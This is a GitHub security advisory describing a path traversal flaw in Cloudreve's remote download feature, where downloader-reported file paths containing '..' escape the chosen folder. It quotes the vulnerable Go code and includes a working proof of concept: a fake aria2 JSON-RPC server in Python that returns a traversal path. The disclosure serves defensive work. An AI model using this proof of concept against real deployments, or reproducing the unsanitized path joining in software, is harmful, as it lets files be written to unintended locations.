# [M] Cloudreve's remote download file paths can escape the selected destination directory

## Summary
Severity: Medium
Advisory: GHSA-w8j7-39hp-8x59
CWE: CWE-22, CWE-23
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N/E:P (CVSS_V4)
Published: 2026-08-24
Source: https://github.com/advisories/GHSA-w8j7-39hp-8x59
Type: github-advisory

## Affected
- Go: `github.com/cloudreve/Cloudreve/v4` — affected >=0

## Details
### Summary

Cloudreve trusts file paths returned by the configured remote downloader. A downloader-reported path such as `../../escaped.txt` can cause a downloaded file to be created outside the user-selected destination directory.

### Details

In the remote download master transfer path, Cloudreve joins the user-selected destination URI with the downloader-reported file name.

```go
// pkg/filemanager/workflows/remote_download.go:436-438
sanitizedName := sanitizeFileName(file.Name)
dst := dstUri.JoinRaw(sanitizedName)
src := filepath.FromSlash(path.Join(m.state.Status.SavePath, file.Name))
```

The same issue also exists when constructing slave upload payloads.

```go
// pkg/filemanager/workflows/remote_download.go:323-327
dst := dstUri.JoinRaw(sanitizeFileName(f.Name))
src := path.Join(m.state.Status.SavePath, f.Name)
payload.Files = append(payload.Files, SlaveUploadEntity{
	Src:   src,
	Uri:   dst,
```

The sanitizer does not remove `/`, `.`, or `..` path segments.

```go
// pkg/filemanager/workflows/remote_download.go:648-650
func sanitizeFileName(name string) string {
	r := strings.NewReplacer("\\", "_", ":", "_", "*", "_", "?", "_", "\"", "_", "<", "_", ">", "_", "|", "_")
	return r.Replace(name)
}
```

`JoinRaw()` splits the raw string by `/` and joins the segments, allowing `..` to affect the final URI path.

```go
// pkg/filemanager/fs/uri.go:173-175
func (u *URI) JoinRaw(elem string) *URI {
	return u.Join(strings.Split(strings.TrimPrefix(elem, Separator), Separator)...)
}
```

For aria2, Cloudreve derives `downloader.TaskFile.Name` from the path returned by `aria2.tellStatus().files[].path`.

```go
// pkg/downloader/aria2/aria2.go:148-159
relPath := strings.TrimPrefix(filepath.ToSlash(item.Path), savePath)
if len(relPath) > 0 {
	relPath = relPath[1:]
}
return downloader.TaskFile{
	Index:    index,
	Name:     relPath,
```

Therefore, if the selected destination is: `cloudreve://my/victim/safe`, the downloader reports `../../escaped.txt`, the final upload destination becomes `cloudreve://my/escaped.txt`

The issue can move the final Cloudreve URI further up the user’s any accessible namespace, but is subject to Cloudreve’s normal permission and upload checks.

### PoC

The PoC uses a fake aria2 JSON-RPC service to simulate a downloader returning a traversal path. The vulnerable input is downloader metadata returned by the downloader API, not the HTTP response body of the downloaded URL.

Setup:

```text
Cloudreve official Docker image
PostgreSQL
Redis
Fake aria2 JSON-RPC service
```

Configure the master node in the Cloudreve admin UI:

```text
Remote download capability: enabled
Downloader provider: aria2
aria2 RPC server: http://fake-aria2:6800/jsonrpc
aria2 token: empty
```

Create this folder structure in the file manager:

```text
My files /
  victim /
    safe /
```

Create a remote download task using any URL in the `victim/safe` directory, for example:

```text
http://attacker.invalid/file
```

The fake aria2 service returns:

```text
files[0].path = <saveDir>/../../escaped.txt
```

Expected result after the remote download task completes:

```text
cloudreve://my/escaped.txt exists
```

This demonstrates that the downloaded file escapes both the selected destination directory and its parent directory.

### Impact

If a configured remote downloader returns malicious file metadata, Cloudreve may create downloaded files outside the destination directory selected by the user who starts the remote download task.

This affects authenticated users who have remote-download permission and create remote download tasks. The resulting file is still subject to Cloudreve’s normal upload and permission checks, but it may be placed in an unexpected writable location outside the selected folder.

### Appendix: fake_aria2.py

```python
import json
import os
from http.server import BaseHTTPRequestHandler, HTTPServer

GID = "0123456789abcdef"
CONTENT = b"created outside the selected Cloudreve destination\n"
save_dir = "/cloudreve/data/temp/aria2/poc-final"


def write_source_file():
    source = os.path.normpath(os.path.join(save_dir, "..", "..", "escaped.txt"))
    os.makedirs(os.path.dirname(source), exist_ok=True)
    with open(source, "wb") as f:
        f.write(CONTENT)
    print(f"fake aria2 source file: {source}", flush=True)


def response(rpc_id, result):
    return json.dumps({"jsonrpc": "2.0", "id": rpc_id, "result": result}).encode()


class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        global save_dir

        raw = self.rfile.read(int(self.headers.get("Content-Length", "0")))
        req = json.loads(raw or b"{}")
        method = req.get("method")
        rpc_id = req.get("id")

        if method == "aria2.addUri":
            for item in req.get("params", []):
                if isinstance(item, dict) and item.get("dir"):
                    save_dir = item["dir"]
                    break
            write_source_file()
            result = GID
        elif method == "aria2.tellStatus":
            result = {
                "gid": GID,
                "status": "complete",
                "totalLength": str(len(CONTENT)),
                "completedLength": str(len(CONTENT)),
                "uploadLength": "0",
                "downloadSpeed": "0",
                "uploadSpeed": "0",
                "infoHash": "",
                "numPieces": "1",
                "dir": save_dir,
                "files": [
                    {
                        "index": "1",
                        "path": f"{save_dir}/../../escaped.txt",
                        "length": str(len(CONTENT)),
                        "completedLength": str(len(CONTENT)),
                        "selected": "true",
                        "uris": [],
                    }
                ],
                "bittorrent": {"mode": "single", "info": {"name": "poc-final"}},
            }
        elif method == "aria2.getVersion":
            result = {"version": "fake-poc-final", "enabledFeatures": []}
        else:
            result = "OK"

        body = response(rpc_id, result)
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, fmt, *args):
        return


if __name__ == "__main__":
    print("fake aria2 JSON-RPC listening on :6800", flush=True)
    HTTPServer(("0.0.0.0", 6800), Handler).serve_forever()
```

## References
- https://github.com/cloudreve/cloudreve/security/advisories/GHSA-w8j7-39hp-8x59
- https://github.com/cloudreve/cloudreve
